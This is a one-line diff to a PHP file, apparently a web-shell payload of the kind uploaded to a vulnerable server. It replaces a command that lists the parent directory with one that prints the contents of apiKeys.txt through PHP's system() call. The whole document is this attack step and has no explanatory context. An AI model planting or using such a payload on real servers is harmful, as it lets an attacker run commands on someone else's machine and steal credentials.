@@ -1,1 +1,1 @@
-<?php echo system("ls -la .."); ?>
+<?php echo system("cat apiKeys.txt"); ?>
